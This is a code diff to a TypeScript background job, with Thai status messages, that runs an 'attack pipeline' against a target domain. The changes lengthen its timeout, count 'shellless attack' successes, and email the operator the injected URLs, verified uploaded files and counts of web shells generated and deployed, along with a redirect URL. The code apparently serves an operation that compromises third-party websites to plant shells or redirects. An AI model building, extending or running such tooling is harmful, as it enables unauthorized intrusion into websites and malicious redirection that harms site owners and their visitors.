@@ -303,7 +303,7 @@ async function runPipelineInBackground(
     try {
       pipelineResult = await Promise.race([
         runUnifiedAttackPipeline(pipelineConfig, onEvent),
-        new Promise<PipelineResult>((_, reject) => setTimeout(() => reject(new Error("Pipeline timeout (3min)")), 3 * 60 * 1000)),
+        new Promise<PipelineResult>((_, reject) => setTimeout(() => reject(new Error("Pipeline timeout (6min)")), 6 * 60 * 1000)),
         new Promise<PipelineResult>((_, reject) => {
           signal.addEventListener("abort", () => reject(new Error("Job cancelled by user")));
         }),
@@ -355,11 +355,14 @@ async function runPipelineInBackground(
       await markDeployFailed(deployId, "Pipeline returned no result", duration);
     }
 
+    const shelllessSuccesses = pipelineResult?.shelllessResults?.filter(r => r.success) || [];
     const statusText = hasVerified
       ? `🎉 Pipeline สำเร็จ! ${pipelineResult!.verifiedFiles.length} files verified`
       : partial
         ? `⚠️ Pipeline บางส่วนสำเร็จ — ${pipelineResult!.uploadedFiles.length} files uploaded แต่ยังไม่ verified`
-        : `❌ Pipeline ล้มเหลว — ไม่สามารถวางไฟล์ได้`;
+        : shelllessSuccesses.length > 0
+          ? `⚠️ Shellless Attack สำเร็จ ${shelllessSuccesses.length} methods (ไม่ต้องวางไฟล์)`
+          : `❌ Pipeline ล้มเหลว — ไม่สามารถวางไฟล์ได้ + Shellless Attack ไม่สำเร็จ`;
 
     await persistEvent(deployId, {
       phase: "complete",
@@ -372,11 +375,30 @@ async function runPipelineInBackground(
       } : undefined,
     });
 
-    // Notify owner
+    // Notify owner (detailed email report)
     try {
+      const shelllessDetail = shelllessSuccesses.length > 0
+        ? `\n\nShellless Successes:\n${shelllessSuccesses.map(r => `- ${r.method}: ${r.detail}${r.injectedUrl ? ` → ${r.injectedUrl}` : ""}`).join("\n")}`
+        : "";
+      const verifiedDetail = pipelineResult && pipelineResult.verifiedFiles.length > 0
+        ? `\n\nVerified URLs:\n${pipelineResult.verifiedFiles.map(f => `- ${f.url}`).join("\n")}`
+        : "";
+      const errorDetail = pipelineResult && pipelineResult.errors.length > 0
+        ? `\n\nErrors (top 5):\n${pipelineResult.errors.slice(0, 5).map(e => `- ${e}`).join("\n")}`
+        : "";
+
       await notifyOwner({
-        title: `${hasVerified ? "✅" : partial ? "⚠️" : "❌"} Deploy ${hasVerified ? "สำเร็จ" : partial ? "บางส่วน" : "ล้มเหลว"}: ${params.targetDomain}`,
-        content: `Job #${deployId} เสร็จแล้ว (${Math.round(duration / 1000)}s)\n${statusText}`,
+        title: `${hasVerified ? "✅" : shelllessSuccesses.length > 0 ? "⚠️" : partial ? "⚠️" : "❌"} FridayAI Report: ${params.targetDomain}`,
+        content: [
+          `Job #${deployId} — ${statusText}`,
+          `Duration: ${Math.round(duration / 1000)}s`,
+          `Target: ${params.targetDomain}`,
+          `Redirect: ${params.redirectUrl}`,
+          pipelineResult ? `Shells: ${pipelineResult.shellsGenerated}, Uploads: ${pipelineResult.uploadAttempts}, Deployed: ${pipelineResult.uploadedFiles.length}, Verified: ${pipelineResult.verifiedFiles.length}` : "",
+          shelllessDetail,
+          verifiedDetail,
+          errorDetail,
+        ].filter(Boolean).join("\n"),
       });
     } catch { /* best-effort */ }
 
